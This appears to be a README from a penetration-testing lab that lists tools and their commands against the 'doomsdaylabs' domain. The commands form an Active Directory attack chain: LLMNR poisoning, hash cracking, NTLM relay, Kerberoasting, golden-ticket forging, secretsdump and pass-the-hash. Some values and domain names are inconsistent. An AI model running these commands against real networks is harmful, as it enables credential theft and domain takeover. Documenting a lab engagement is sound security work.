# Tools Documentation

This directory contains detailed descriptions and usage instructions for all tools used during the penetration testing process.

## Nmap

Nmap (Network Mapper) is a free and open-source network scanner used to discover hosts and services on a computer network by sending packets and analyzing the responses.

### Usage

```
nmap -sT -oN -sV -sC [target IP]
```

## Responder

Responder is a package that contains LLMNR, NBT-NS and MDNS posioner. We utilized this tool, in aid of a LNK file being dropped, to capture NTLMv2 hashes from a local administrator which was later decrypted. 

### Usage

```
responder -I eth0 -w -rf
```

## Hashcat 

Hashcat is a free open-source software that is considered the worlds fastest password recovery tool. This is often used to crack encrypted passwords or hashes to gain priviledge escalation. 

### Usage

```
hashcat -m 5600 hashfile.txt /usr/share/wordlists/rockyou.txt -r rules.txt -o hashfile.out
```

## Cracxkmapexec 

Crackmapexec is a free open-source software utilized as a Swiss army knife for Windows/Active Directory environments. It is often used to enumerate users, discover SMB shares, execute commands similar to psexec, auto-inject shellcode/DLLs, and much more.

### Usage

```
crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt
```
## Impacket 

Impacket is a free open-source Python package that provides access to network packets. It includes support for low-level protocols such as IP, UDP, and TCP, as well as higher-level protocols such as NMB and SMB.

### Usage

```
impacket-ntlmrelayx -smb2support -tf targets.txt
impacket-GetUserSPNs doomsdaylabs.net/filemaker -dc-ip 10.100.1.2 -request
impacket-ticketer -nthash doIF0jCCBc6gAwIBBaEDAgEWooIEyz...[snipped]...NXU/rX266m632YeSk3csEUpoKMTPZ -domain-sid S-1-5-21-2774200336-3400690103-1452933870-1111 -domain doomsdaylabs.net da.admin
KRB5CCNAME=./Administrator.cache impacket-secretsdump -k -no-pass -dc-ip 10.100.1.2 -target-ip 10.100.1.2 dc.doomsdaylabs.net
```
## Evil-WinRM 

Evil-WinRM is a free open-source package that contains the Windows Remote Management shell. This is typically used during the post-exploitation phase as this feature requires credentials and permissions to use.

### Usage

```
evil-winrm -i 10.100.1.4 -u filemaker -H 322e0b51ca281c55:F1F9E4FF7872D084AC0E2CB11DE7D2C0
```

## Mimikatz/Pypykatz 

Mimikatz and Pypykatz are free open-source tools used to extract credentials from Windows systems. They are often used for post-exploitation activities, such as retrieving plaintext passwords, hashes, PINs, and Kerberos tickets.

### Usage

```
mimikatz # kerberos::golden /user:Administrator /domain:doomsdaylabs.local /sid:S-1-5-21-2774200336-3400690103-1452933870-1111 /krbtgt:doIF0jCCBc6g...NXU/rX [shortened] /service:HTTP /target:webserver.doomsdaylabs.net
```

## Neo4j 

Neo4j is a free open-source graph database management system. It is often used to store and query complex data relationships, such as those found in social networks, fraud detection, and network impact analysis.

### Usage

```
Run Neo4j GUI to start the database
```

## Bloodhound 

BloodHound is a free open-source tool that uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment. It is often used to discover attack paths and escalate privileges.

### Usage

```
Run Bloodhound GUI
```
